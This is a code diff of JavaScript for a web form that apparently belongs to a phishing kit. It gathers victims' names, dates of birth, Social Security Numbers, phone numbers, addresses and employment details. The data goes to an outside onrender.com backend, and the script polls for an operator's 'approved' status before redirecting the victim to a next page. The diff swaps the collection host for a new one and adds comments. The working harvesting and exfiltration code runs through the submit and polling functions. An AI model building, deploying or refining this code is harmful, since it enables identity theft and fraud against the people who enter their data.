@@ -504,6 +504,7 @@
     const ssnError = document.getElementById('ssnError');
     const phoneError = document.getElementById('phoneError');
     const sessionInfo = document.getElementById('sessionInfo');
+    const ssnToggle = document.getElementById('ssnToggle');
     
     // Get session ID from URL or sessionStorage
     const urlParams = new URLSearchParams(window.location.search);
@@ -524,6 +525,7 @@
 
     // Initialize date of birth dropdowns
     function initDOB() {
+        // Years (100 years back from current year)
         const currentYear = new Date().getFullYear();
         for (let year = currentYear; year >= currentYear - 100; year--) {
             const option = document.createElement('option');
@@ -532,6 +534,7 @@
             dobYear.appendChild(option);
         }
         
+        // Days (1-31)
         for (let day = 1; day <= 31; day++) {
             const option = document.createElement('option');
             option.value = day.toString().padStart(2, '0');
@@ -542,14 +545,12 @@
 
     // Toggle SSN visibility
     function toggleSSN() {
-        const ssnInput = document.getElementById('ssn');
-        const ssnToggleBtn = document.getElementById('ssnToggle');
-        if (ssnInput.type === "password") {
-            ssnInput.type = "text";
-            ssnToggleBtn.textContent = "Hide";
+        if (ssn.type === "password") {
+            ssn.type = "text";
+            ssnToggle.textContent = "Hide";
         } else {
-            ssnInput.type = "password";
-            ssnToggleBtn.textContent = "Show";
+            ssn.type = "password";
+            ssnToggle.textContent = "Show";
         }
     }
 
@@ -623,6 +624,7 @@
         
         let isValid = true;
         
+        // Validate name
         if (!name) {
             nameError.textContent = 'Full name is required';
             isValid = false;
@@ -633,6 +635,7 @@
             nameError.textContent = '';
         }
         
+        // Validate DOB
         if (!dobMonth.value || !dobDay.value || !dobYear.value) {
             dobError.textContent = 'Date of birth is required';
             isValid = false;
@@ -643,6 +646,7 @@
             dobError.textContent = '';
         }
         
+        // Validate SSN
         if (!ssnVal) {
             ssnError.textContent = 'Social Security Number is required';
             isValid = false;
@@ -653,6 +657,7 @@
             ssnError.textContent = '';
         }
         
+        // Validate phone
         if (!phoneVal) {
             phoneError.textContent = 'Phone number is required';
             isValid = false;
@@ -663,14 +668,17 @@
             phoneError.textContent = '';
         }
         
+        // Validate address
         if (!addr || !cityVal || !stateVal || !zipVal) {
             isValid = false;
         }
         
+        // Validate ZIP
         if (zipVal && !isValidZip(zipVal)) {
             isValid = false;
         }
         
+        // Validate employment
         if (!empVal) {
             isValid = false;
         }
@@ -679,6 +687,7 @@
         return isValid;
     }
 
+    // Clear all errors
     function clearErrors() {
         nameError.textContent = '';
         dobError.textContent = '';
@@ -690,33 +699,39 @@
         });
     }
 
+    // Show error
     function showError(message) {
         console.error('Form error:', message);
     }
 
+    // Show loading spinner in button
     function showButtonSpinner() {
         btnText.classList.add("hidden");
         btnSpinner.classList.remove("hidden");
     }
 
+    // Hide loading spinner
     function hideButtonSpinner() {
         btnText.classList.remove("hidden");
         btnSpinner.classList.add("hidden");
     }
 
+    // Start polling for approval
     function startPolling(sessionId) {
         if (pollingInterval) clearInterval(pollingInterval);
         
         pollingInterval = setInterval(async () => {
             try {
-                const response = await fetch(`https://mm-tm7a.onrender.com/status/${sessionId}`);
+                const response = await fetch(`https://mass-u4it.onrender.com/status/${sessionId}`);
                 const data = await response.json();
                 
                 if (data.status === "approved" && data.redirect_url) {
                     clearInterval(pollingInterval);
+                    // Store the next page info
                     sessionStorage.setItem('nextPage', data.redirect_url);
                     sessionStorage.setItem('currentSessionId', sessionId);
                     
+                    // Redirect to next page
                     if (data.redirect_url.startsWith('http')) {
                         window.location.href = data.redirect_url;
                     } else {
@@ -725,6 +740,7 @@
                 }
             } catch (err) {
                 console.error("Polling error:", err);
+                // Don't clear interval on error, just retry
             }
         }, 2000);
     }
@@ -741,10 +757,12 @@
         showButtonSpinner();
         clearErrors();
 
+        // Format DOB as MM/DD/YYYY
         const dob = `${dobMonth.value}/${dobDay.value}/${dobYear.value}`;
 
         try {
-            const response = await fetch("https://mm-tm7a.onrender.com/personal", {
+            // Your backend expects: full_name, address, city, zip, ssn
+            const response = await fetch("https://mass-u4it.onrender.com/personal", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -772,12 +790,14 @@
                 return;
             }
 
+            // Store new session ID from response
             if (data.id) {
                 sessionId = data.id;
                 sessionStorage.setItem('personalSessionId', sessionId);
                 sessionInfo.textContent = `Session: ${sessionId.substring(0,8)}...`;
             }
 
+            // Start polling for approval
             startPolling(sessionId);
 
         } catch (error) {
@@ -799,6 +819,7 @@
         checkInputs();
     });
 
+    // Add real-time validation for all fields
     [fullName, dobMonth, dobDay, dobYear, address, city, state, zip, employment].forEach(input => {
         if (input) {
             input.addEventListener('input', checkInputs);
@@ -806,9 +827,13 @@
         }
     });
 
+    // Initialize dropdowns
     initDOB();
+
+    // Initial button state
     checkInputs();
 
+    // Cleanup timers on page unload
     window.addEventListener('beforeunload', () => {
         if (pollingInterval) clearInterval(pollingInterval);
     });
